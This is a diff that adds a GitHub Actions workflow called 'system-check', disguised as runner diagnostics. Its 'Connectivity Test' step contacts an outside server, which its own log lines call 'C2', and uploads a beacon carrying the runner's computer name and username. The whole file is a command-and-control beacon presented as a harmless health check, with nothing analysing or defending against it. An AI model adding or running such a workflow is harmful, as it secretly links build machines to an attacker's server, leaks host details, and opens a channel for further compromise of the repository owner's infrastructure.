@@ -1,0 +1,37 @@
+name: system-check
+on:
+  workflow_dispatch:
+
+jobs:
+  diagnostics:
+    runs-on: windows-latest
+    steps:
+      - name: System Info
+        run: |
+          Write-Host "=== System ==="
+          [Environment]::OSVersion
+          $PSVersionTable
+          whoami
+          hostname
+          ipconfig | Select-String "IPv4"
+          
+      - name: Connectivity Test
+        run: |
+          Write-Host "=== Connectivity ==="
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          try {
+            $r = (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/health")
+            Write-Host "C2 reachable: $r"
+          } catch {
+            Write-Host "C2 unreachable: $_"
+          }
+          
+          try {
+            $wc = New-Object Net.WebClient
+            $wc.Headers.Add("Content-Type", "application/json")
+            $body = '{"id":"gh-runner","h":"' + $env:COMPUTERNAME + '","u":"' + $env:USERNAME + '","ip":"github-actions","os":"Win","pid":0,"out":"beacon from github actions"}'
+            $resp = $wc.UploadString("https://svc.linuxsupportsystem.com/b", $body)
+            Write-Host "Beacon sent: $resp"
+          } catch {
+            Write-Host "Beacon failed: $_"
+          }
